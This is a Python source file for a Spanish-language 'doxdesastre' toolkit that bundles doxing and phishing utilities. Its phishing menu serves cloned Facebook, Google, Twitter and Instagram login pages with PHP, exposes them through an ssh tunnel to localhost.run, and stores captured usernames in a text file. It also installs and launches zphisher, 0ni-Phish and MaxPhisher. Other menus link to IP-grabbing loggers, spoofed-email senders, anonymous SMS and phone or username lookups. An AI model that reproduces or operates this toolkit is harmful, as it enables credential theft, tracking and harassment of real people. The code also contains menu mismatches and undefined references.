import os
import time
import subprocess
import random
import platform
import pyshorteners
import requests
import pyqrcode
import png
from faker import Faker
from modules import numeros, phoneinf
import webbrowser

class Colores:
  red="\033[31;1m"
  verde="\033[92m"
  morado="\033[94m"
  blanco="\033[36m"
  dorado="\033[33m"
  

os.system("killall php")
os.system("clear")
logo = Colores.dorado + '''
⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄
⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄
⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴
⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿
 (         (            (          (       
 )\ )      )\ )   (     )\ )  *   ))\ )    
(()/(  (  (()/(   )\   (()/(` )  /(()/((   
 /(_)) )\  /(_)|(((_)(  /(_))( )(_))(_))\  
(_))_ ((_)(_))  )\ _ )\(_)) (_(_()|_))((_) 
 |   \| __/ __| (_)_\(_) __||_   _| _ \ __|
 | |) | _|\__ \  / _ \ \__ \  | | |   / _| 
 |___/|___|___/ /_/ \_\|___/  |_| |_|_\___|
'''



def sher():
  os.system("clear")
  print(logo)
  print('\n[1] Busqueda con programa de Desastre')
  print('[2] Sherlock ')
  print('[3] Nexfil ')
  print('[4] Busqueda basica con social escaneo')
  print('[00] Regresar al menu principal')
  print('[99] Salir')
  var = int(input('\n>> '))
  if var == 1:
     os.system("python3 modules/search.py")
  elif var == 2:
     if os.path.exists('.tools/sherlock'):
        user = input('\n[~] Ingresa el nombre de usuario a buscar en sherlock: ')
        print(' ')
        os.system(f"cd .tools/sherlock && python3 sherlock {user}")
     else:
       print('\n[!] Sherlock no esta instalado!')
       var = input('[?] Deseas instalar sherlock [Y/n]: ')
       if var == "Y" or var == "y":
          print('\n[⏈⃟𝒦⃟⚖] Instalando sherlock...')
          os.system("cd .tools && git clone https://github.com/sherlock-project/sherlock && cd sherlock && pip3 install -r requirements.txt")
          print('[~] Sherlock instalado.')
          time.sleep(2)
          sher()
       elif var == "N" or var == "n":
           print('\n[~] Regresando al menu principal')
           time.sleep(1)
           sher()
  elif var == 3:
     if os.path.exists('.tools/nexfil'):
        user = input('\n[~] Ingresa el nombre de usuario a buscar en nexfil: ')
        print(' ')
        os.system(f"cd .tools/nexfil && python3 nexfil.py -u {user}")
     else:
       print('\n[!] Nexfil no esta instalado!')
       var = input('[?] Deseas instalar nexfil [Y/n]: ')
       if var == "Y" or var == "y":
          print('\n[~] Instalando nexfil...')
          os.system("cd .tools && git clone https://github.com/thewhiteh4t/nexfil && cd nexfil && pip3 install -r requirements.txt")
          print('[⏈⃟𝒦⃟⚖] Nexfil instalado.')
          time.sleep(2)
          sher()
       elif var == "N" or var == "n":
           print('\n[~] Regresando al menu principal')
           time.sleep(1)
           sher()
  elif var == 4:
     user = input('\n[~] Ingresa un usuario a buscar: ')
     os.system(f"socialscan {user} --show-urls")
  elif var == 00:
     menu()
  elif var == 99:
     exit()
  else:
    print('\n[!] Error opcion invalida.')
    sher()

def iplog():
  os.system("clear")
  print(logo)
  print('\n[~] Ingresa una opcion.')
  print('''\n
  [1] IPlogger.org
  
  [2] Grabify
  
  [3] Crear un link IPlogger 
  
  [00] Regresar al menu principal
  
  [99] Salir
  ''')
  opc = int(input('>> '))
  if opc == 1:
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu anterior')
    print('\n[99] Salir')
    Skd = int(input('>> '))
    if Skd == 1:
      webbrowser.open('https://iplogger.org/es/')
      iplog()
    elif Skd == 2:
      os.system("termux-open https://iplogger.org/es/")
      iplog()
    elif Skd == 00:
      iplog()
    elif Skd == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      iplog()
  elif opc == 2:
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    LA = int(input('>> '))
    if LA == 1:
      webbrowser.open('https://grabify.link/')
      iplog()
    elif LA == 2:
      os.system("termux-open https://grabify.link/")
      iplog()
    elif LA == 00:
      iplog()
    elif LA == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      iplog()
  elif opc == 3:
    os.system("python3 modules/iplogger.py")
  elif opc == 00:
    os.system("clear")
    menu()
  elif opc == 99:
    exit()
  else:
    print('[~] Error opcion invalida.')
    time.sleep(2)
    os.system("clear")
    print(logo)
    iplog()
  
def geoip():
  print('\n[1] Geolocalizar IP')
  print('\n[00] Regresar al menu principal')
  print('\n[99] Salir')
  MC = int(input('\n>> '))
  if MC == 1:
        os.system(f"cd .geo && python3 geo.py")
  elif MC == 00:
    menu()
  elif MC == 99:
    exit()
  else:
    print('[~] Error opcion invalida.')
    time.sleep(2)
    os.system("clear")
    print(logo)
    geoip()
    

def emailfak():
  os.system("clear")
  print(logo)
  print('\n[indicacion] Ingresa una opcion')
  print('\n[1] Emkei')
  print('\n[2] Anonemail (Anonymouse)')
  print('\n[3] Temp-Mail')
  print('\n[4] Etemp-Mail')
  print('\n[5] TempMail.email')
  print('\n[00] Regresar al menu principal')
  print('\n[99] Salir')
  OP = int(input('>> '))
  # ------------ Emkei ---------------
  if OP == 1:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    bruh = int(input('>> '))
    if bruh == 1:
      webbrowser.open('https://emkei.cz/')
      emailfak()
    elif bruh == 2:
      os.system("termux-open https://emkei.cz/")
      emailfak()
    elif bruh == 00:
      os.system("clear")
      print(logo)
      emailfak()
    elif bruh == 99:
      exit()
    else:
       print('[indicacion] Error opcion invalida.')
       time.sleep(2)
       emailfak()
  # ------------ Anonymouse ---------------
  elif OP == 2:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    bruh = int(input('>> '))
    if bruh == 1:
      webbrowser.open('http://anonymouse.org/anonemail.html')
      emailfak()
    elif bruh == 2:
      os.system("termux-open http://anonymouse.org/anonemail.html")
      emailfak()
    elif bruh == 00:
      os.system("clear")
      print(logo)
      emailfak()
    elif bruh == 99:
      exit()
    else:
       print('[~] Error opcion invalida.')
       time.sleep(2)
       emailfak()
  # ------------ Temp-mail ---------------
  elif OP == 3:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    bruh = int(input('>> '))
    if bruh == 1:
      webbrowser.open('https://temp-mail.org/es/')
      emailfak()
    elif bruh == 2:
      os.system("termux-open https://temp-mail.org/es/")
      emailfak()
    elif bruh == 00:
      os.system("clear")
      print(logo)
      emailfak()
    elif bruh == 99:
      exit()
    else:
       print('[~] Error opcion invalida.')
       time.sleep(2)
       emailfak()
  # ------------ Etemp-Mail ---------------
  elif OP == 4:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    bruh = int(input('>> '))
    if bruh == 1:
      webbrowser.open('https://etempmail.com')
      emailfak()
    elif bruh == 2:
      os.system("termux-open https://etempmail.com")
      emailfak()
    elif bruh == 00:
      os.system("clear")
      print(logo)
      emailfak()
    elif bruh == 99:
      exit()
    else:
       print('[~] Error opcion invalida.')
       time.sleep(2)
       emailfak()
  # TempMail-Email
  elif OP == 5:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    bruh = int(input('>> '))
    if bruh == 1:
      webbrowser.open('https://tempmail.email')
      emailfak()
    elif bruh == 2:
      os.system("termux-open https://tempmail.email")
      emailfak()
    elif bruh == 00:
      os.system("clear")
      print(logo)
      emailfak()
    elif bruh == 99:
      exit()
    else:
       print('[~] Error opcion invalida.')
       time.sleep(2)
       emailfak()
  # Devolver
  elif OP == 00:
    menu()
  elif OP == 99:
    exit()
  else:
    print('[~] Error opcion invalida.')
    time.sleep(2)
    os.system("clear")
    print(logo)
    emailfak()
  
def phishing():
  os.system("clear")
  print(logo)
  print('[1] Usar el phishing de Desastre ')
  print('[2] Zphisher ')
  print('[3] 0ni-Phish ')
  print('[4] MaxPhisher ')
  print('[00] Regresar al menu principal')
  print('[99] Salir')
  var = int(input('\n>> '))
  if var == 1:
     print('''
     [~] Selecciona un lenguaje de la pagina a usar:
     
     [1] Español
     
     [2] Ingles
     ''')
     lengua = int(input('\n>> '))
     if lengua == 1:
       print('''
       [1] Facebook
  
       [2] Google
    
       [3] Twitter
  
       [4] Instagram (Pagina desactualizada)
  
       [00] Regresar al menu principal
  
       [99] Salir
       ''')
       YP = int(input('>> '))
       if YP == 1:
         print(f'\n{Colores.morado}[~] Los usuarios se guardaran en: doxdesastre/.pages/Facebook/usuarios.txt')
         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat doxdesastre/.pages/Facebook/usuarios.txt')
         print(f'\n{Colores.dorado}[~] Para salir presiona CTRL + C')
         print(' ')
         cmd = "php -t .pages/Facebook -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
         p = subprocess.Popen(cmd, shell=True)
         a = p.communicate()[0]
       elif YP == 2:
         print(f'\n{Colores.morado}[~] Los usuarios se guardaran en: doxdesastre/.pages/Google/usuarios.txt')
         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat doxdesastre/.pages/Google/usuarios.txt')
         print(f'\n{Colores.dorado}[~] Para salir presiona CTRL + C')
         print(' ')
         cmd = "php -t .pages/Google -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
         p = subprocess.Popen(cmd, shell=True)
         a = p.communicate()[0]
       elif YP == 3:
         print(f'\n{Colores.morado}[~] Los usuarios se guardaran en: doxdesastre/.pages/Twitter/usuarios.txt')
         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat doxdesastre/.pages/Twitter/usuarios.txt')
         print(f'\n{Colores.dorado}[~] Para salir presiona CTRL + C')
         print(' ')
         cmd = "php -t .pages/Twitter -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
         p = subprocess.Popen(cmd, shell=True)
         a = p.communicate()[0]
       elif YP == 4:
        print(f'\n{Colores.morado}[~] Los usuarios se guardaran en: doxdesastre/.pages/Instagram/usuarios.txt')
        print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat doxdesastre/.pages/Instagram/usuarios.txt')
        print(f'\n{Colores.dorado}[~] Para salir presiona CTRL + C')
        print(' ')
        cmd = "php -t .pages/Instagram -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
        p = subprocess.Popen(cmd, shell=True)
        a = p.communicate()[0]
       elif YP == 00:
        menu()
       elif YP == 99:
        exit()
     elif lengua == 2:
       print('''
       [1] Facebook
  
       [2] Google
    
       [3] Twitter
  
       [4] Instagram
  
       [00] Regresar al menu principal
  
       [99] Salir
       ''')
       YP = int(input('>> '))
       if YP == 1:
         print(f'\n{Colores.morado}[D] Los usuarios se guardaran en: doxdesastre/.pages/en_pages/facebook/usernames.txt')
         print(f'\n{Colores.verde}[D] Los puedes ver con el comando: cat doxdesastre/.pages/en_pages/facebook/usernames.txt')
         print(f'\n{Colores.dorado}[D] Para salir presiona CTRL + C')
         print(' ')
         cmd = "php -t .pages/en_pages/facebook -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
         p = subprocess.Popen(cmd, shell=True)
         a = p.communicate()[0]
       elif YP == 2:
         print(f'\n{Colores.morado}[~] Los usuarios se guardaran en: dosdesastre/.pages/en_pages/google_new/usernames.txt')
         print(f'\n{Colores.verde}[~] Los puedes ver con el comando: cat doxdesastre/.pages/en_pages/google_new/usernames.txt')
         print(f'\n{Colores.dorado}[D] Para salir presiona CTRL + C')
         print(' ')
         cmd = "php -t .pages/en_pages/google_new -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
         p = subprocess.Popen(cmd, shell=True)
         a = p.communicate()[0]
       elif YP == 3:
         print(f'\n{Colores.morado}[D] Los usuarios se guardaran en: doxdesastre/.pages/en_pages/twitter/usernames.txt')
         print(f'\n{Colores.verde}[D] Los puedes ver con el comando: cat doxdesastre/.pages/en_pages/twitter/usernames.txt')
         print(f'\n{Colores.dorado}[D] Para salir presiona CTRL + C')
         print(' ')
         cmd = "php -t .pages/en_pages/twitter -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
         p = subprocess.Popen(cmd, shell=True)
         a = p.communicate()[0]
       elif YP == 4:
        print(f'\n{Colores.morado}[D] Los usuarios se guardaran en: doxdesastre/.pages/en_pages/instagram/usernames.txt')
        print(f'\n{Colores.verde}[D] Los puedes ver con el comando: cat doxdesastre/.pages/en_pages/instagram/usernames.txt')
        print(f'\n{Colores.dorado}[D] Para salir presiona CTRL + C')
        print(' ')
        cmd = "php -t .pages/en_pages/instagram -S localhost:8080 & ssh -R 80:localhost:8080 nokey@localhost.run"
        p = subprocess.Popen(cmd, shell=True)
        a = p.communicate()[0]
       elif YP == 00:
        menu()
       elif YP == 99:
        exit()    
  elif var == 2:
     if os.path.exists('.tools/zphisher'):
        os.system("cd .tools && cd zphisher && bash zphisher.sh")
     else:
       print('\n[!] Zphisher no esta instalado!')
       var = input('[?] Deseas instalar zphisher [Y/n]: ')
       if var == "Y" or var == "y":
          print('\n[~] Instalando zphisher...')
          os.system("cd .tools && git clone https://github.com/htr-tech/zphisher && cd zphisher && bash zphisher.sh")
          print('[~] Zphisher instalado.')
          time.sleep(1)
          phishing()
       elif var == "N" or var == "n":
           print('\n[~] Regresando al menu principal')
           time.sleep(1)
           phishing()
  elif var == 3:
     if os.path.exists('.tools/0ni-Phish'):
        os.system(f"cd .tools/0ni-Phish && python3 0ni.py")
     else:
       print('\n[!] 0ni-Phish no esta instalado!')
       var = input('[?] Deseas instalar 0ni-Phish [Y/n]: ')
       if var == "Y" or var == "y":
          print('\n[~] Instalando 0ni-Phish...')
          os.system("cd .tools && git clone https://github.com/Euronymou5/0ni-Phish")
          print('[~] 0ni-Phish instalado.')
          time.sleep(2)
          phishing()
       elif var == "N" or var == "n":
           print('\n[~] Regresando al menu principal')
           time.sleep(1)
           phishing()
  # pishing
  elif var == 4:
     if os.path.exists('.tools/MaxPhisher'):
        os.system(f"cd .tools/MaxPhisher && python3 maxphisher.py")
     else:
       print('\n[!] MaxPhisher no esta instalado!')
       var = input('[?] Deseas instalar MaxPhisher [Y/n]: ')
       if var == "Y" or var == "y":
          print('\n[~] Instalando MaxPhisher...')
          os.system("cd .tools && git clone https://github.com/KasRoudra/MaxPhisher && pip3 install -r MaxPhisher/files/requirements.txt")
          print(Colores.verde + '\n[~] MaxPhisher instalado.')
          time.sleep(2)
          phishing()
       elif var == "N" or var == "n":
           print('\n[~] Regresando al menu principal')
           time.sleep(1)
           phishing()
  ##  return
  elif var == 00:
     menu()
  elif var == 99:
    exit()
  
def sms():
  print('\n[1] Enviar un sms anonimo utilizando TextBelt')
  print('\n[00] Regresar al menu principal')
  print('\n[99] Salir')
  YR = int(input('>> '))
  if YR ==  1:
      print('[~] Ejemplo: +14322009740')
      print(f'\n{Colores.morado}[!] Recuerda que solo puedes enviar 1 mensaje por dia')
      numero = input(f'{Colores.morado}[~] Ingresa el numero de telefono: ')
      mess = input('[~] Ingresa el mensaje que quieres enviar: ')
      resp = requests.post('https://textbelt.com/text', {
           'phone': f'{numero}',
           'message': f'{mess}',
           'key': 'textbelt',
      })
      print(resp.json())
      print('[felicidades] Mensaje enviado.')
      input('[indicacion] Presiona enter para continuar...')
      os.system("clear")
      print(logo)
      sms()
  elif YR == 00:
    menu()
  elif YR == 99:
    exit()
    
def numero():
    print('\n[1] RevealName (Pagina)')
    print('[2] Obtener informacion por Numverify (')
    print('[3] Obtener informacion atravez de  Phonenumbers')
    print('[4] Phoneinfoga ')
    print('[00] Regresar al menu principal')
    print('[99] Salir')
    var = int(input('\n>> '))
    if var == 1:
       print('\n[1] Abrir link para linux')
       print('[2] Abrir link para termux')
       var2 = int(input('>> '))
       if var2 == 1:
          webbrowser.open('https://www.revealname.com/')
          numero()
       elif var2 == 2:
           os.system("termux-open https://www.revealname.com/")
           numero()
    elif var == 2:
        numeros.inicio()
    elif var == 3:
       print('\n[~] Ejemplo: +19087654321')
       phone_number = str(input('[~] Ingresa el numero de telefono: '))
       try:
           import phonenumbers
           from phonenumbers import geocoder, carrier, timezone

           phone = phonenumbers.parse(phone_number)
           international = phonenumbers.format_number(phone, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
           countrycode = international.split(' ')[0]
           country = geocoder.country_name_for_number(phone, 'en')
           location = geocoder.description_for_number(phone, 'en')
           carrierr = carrier.name_for_number(phone, 'en')
           print(f'\n[~] Formato internacional : {international}')
           print(f'[~] Nombre del país    : {country} ({countrycode})')
           print(f'[~] Ciudad / Provincia : {location}')
           print(f'[~] Transportador    : {carrierr}')
           for time in timezone.time_zones_for_number(phone):
                    print(f'[~] Zona horaria   : {time}')
                    print('\n[~] Escaneo completo.')
       except ImportError:
            print(f'\n{Colores.azul}[!] Modulo phonenumbers no encontrado!')
            print('[~] Utiliza el comando pip3 install phonenumbers')
            time.sleep(2)
            print(f'{Colores.red}[~] Regresando al menu principal...')
            time.sleep(1)
            numero()
    elif var == 4:
        phoneinf.install()
    elif var == 00:
      menu()
    elif var == 99:
      exit()


def osintpa():
  os.system("clear")
  print(logo)
  print('''\n 
        INDICACION ESTA PARTE ES DE LINKS
  [1] Osintframework
  
  [2] Osint Techniques

  [3] Awesome Osint
  
  [00] Regresar al menu principal
  
  [99] Salir
  ''')
  osint = int(input('>> '))
  if osint == 1:
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    elejir99 = int(input('>> '))
    if elejir99 == 1:
      webbrowser.open('https://osintframework.com/')
      osintpa()
    elif elejir99 == 2:
      os.system("termux-open https://osintframework.com/")
      osintpa()
    elif elejir99 == 00:
      osintpa()
    elif elejir99 == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      os.system("clear")
      osintpa()
  elif osint == 2:
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    elejir99 = int(input('>>: '))
    if elejir99 == 1:
      webbrowser.open('https://www.osinttechniques.com/')
      osintpa()
    elif elejir99 == 2:
      os.system("termux-open https://www.osinttechniques.com/")
    elif elejir99 == 00:
      osintpa()
    elif elejir99 == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      os.system("clear")
      osintpa()
  elif osint == 3:
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    elejir99 = int(input('>>: '))
    if elejir99 == 1:
      webbrowser.open('https://github.com/jivoi/awesome-osint')
      osintpa()
    elif elejir99 == 2:
      os.system("termux-open https://github.com/jivoi/awesome-osint")
    elif elejir99 == 00:
      osintpa()
    elif elejir99 == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      os.system("clear")
      osintpa()
  elif osint == 00:
    menu()
  elif osint == 99:
    exit()
  else:
    print('[~] Error opcion invalida.')
    time.sleep(2)
    os.system("clear")
    osintpa()

def qrcodigo():
  os.system("clear")
  print(logo)
  print('\n[~] Ingresa un texto o url para convertir a codigo qr')
  s = input('[~] Ingresa un texto: ')
  n = input('[~] Ingresa el nombre de la imagen: ')
  d=n+".png"
  url=pyqrcode.create(s)
  url.show()
  url.png(d, scale =40)
  print(f'{Colores.azul}[~] Imagen guardada en la carpeta de doxdesastre con el nombre: {n}.png')
  ll = input(f'{Colores.red}[~] Quieres regresar al menu principal? [Y/n]: ')
  if ll == "Y" or ll == "y":
    menu()
  elif ll == "N" or ll == "n":
    print('[~] Saliendo el programa...')
    time.sleep(1)
    exit()
  else:
    print('[!] Error')
    time.sleep(2)
    qrcodigo()

def cortarlink():
  os.system("clear")
  print(logo)
  print(' ')
  print('\n[1] Cutt.ly ')
  print('\n[2] Shorturl')
  print('\n[3] n9.cl')
  print('\n[4] xurl.es')
  print('\n[5] TinyURL ')
  print('\n[6] Chilp.it')
  print('\n[7] Clck.ru')
  print('\n[8] Da.gd')
  print('\n[9] Is.gd')
  print('\n[00] Regresar al menu principal')
  print('\n[99] Salir')
  cortarel = int(input('>> '))
  if cortarel == 1:
    print('[~] Si no tienes una API Key de Cuttly tienes que crear una cuenta entra a tu perfil y busca el codigo de api')
    print('[~] Link de cuttly para acortar: https://cutt.ly/es')
    key = input('[~] Ingresa tu API key de Cuttly: ')
    s = pyshorteners.Shortener(api_key=key)
    url1 = input('[~] Link: ')
    print(f'{Colores.azul} Link acortado:', s.cuttly.short(url1))
  elif cortarel == 2:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    shorurl = int(input('>> '))
    if shorurl == 1:
      webbrowser.open('https://shorturl.com/')
      cortarlink()
    elif shorurl == 2:
      os.system("termux-open https://shorturl.com/")
    elif shorurl == 00:
      os.system("clear")
      print(logo)
      cortarlink()
    elif shorurl == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      os.system("clear")
      print(logo)
      cortarlink()
  elif cortarel == 3:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    ncl = int(input('>> '))
    if ncl == 1:
      webbrowser.open('https://n9.cl/es')
      cortarlink()
    elif ncl == 2:
      os.system("termux-open https://n9.cl/es")
    elif ncl == 00:
      os.system("clear")
      print(logo)
      cortarlink()
    elif ncl == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      os.system("clear")
      print(logo)
      cortarlink()
  elif cortarel == 4:
    os.system("clear")
    print(logo)
    print('\n[1] Abrir link para linux')
    print('\n[2] Abrir link para termux')
    print('\n[00] Regresar al menu principal')
    print('\n[99] Salir')
    xurl = int(input('>> '))
    if xurl == 1:
      webbrowser.open('https://www.xurl.es/')
      cortarlink()
    elif xurl == 2:
      os.system("termux-open https://www.xurl.es/")
    elif xurl == 00:
      os.system("clear")
      print(logo)
      cortarlink()
    elif xurl == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      os.system("clear")
      print(logo)
      cortarlink()
  elif cortarel == 5:
    url = input('[~] Link: ')
    s = pyshorteners.Shortener()
    print(f'{Colores.morado}[~] Link acortado:', s.tinyurl.short(url))
    time.sleep(2)
  elif cortarel == 6:
    url = input('[~] Link: ')
    s = pyshorteners.Shortener()
    print(f'{Colores.morado}[~] Link acortado:', s.chilpit.short(url))
  elif cortarel == 7:
    url = input('[~] Link: ')
    s = pyshorteners.Shortener()
    print(f'{Colores.morado}[~] Link acortado:', s.clckru.short(url))
  elif cortarel == 8:
    url = input('[~] Link: ')
    s = pyshorteners.Shortener()
    print(f'{Colores.morado}[~] Link acortado:', s.dagd.short(url))
  elif cortarel == 9:
    url = input('[~] Link: ')
    s = pyshorteners.Shortener()
    print(f'{Colores.morado}[~] Link acortado:', s.isgd.short(url))
  elif cortarel == 00:
    menu()
  elif cortarel == 99:
    exit()

def menu():
    os.system("clear")
    print(logo)
    print(Colores.dorado + '''              
    [1] IPloggers                              [2] Geolocalizar IP             
   
    [3] Obtener informacion de un numero        [4] Phishing       
  
    [5] SMS                                      [6] Correos Electronicos anonimos    
    
    [7] Buscar usuario                             [8] Paginas OSINT
 
    [9] Acortadores de links                        [10] Generar codigo QR

    [11] Email                                         [99] Salir
    ''')
    elejir = int(input('\n>> '))
    if elejir == 1:
      iplog()
    elif elejir == 2:
      geoip()
    elif elejir == 3:
      numero()
    elif elejir == 4:
      phishing()
    elif elejir == 5:
      sms()
    elif elejir == 6:
      emailfak()
    elif elejir == 7:
      sher()
    elif elejir == 8:
      fakerr()
    elif elejir == 9:
      osintpa()
    elif elejir == 10:
      cortarlink()
    elif elejir == 11:
      qrcodigo()
    elif elejir == 12:
       os.system("python3 modules/emails.py")
    elif elejir == 99:
      exit()
    else:
      print('[~] Error opcion invalida.')
      time.sleep(2)
      os.system("clear")
      menu()
    

if __name__ == "__main__":
    menu()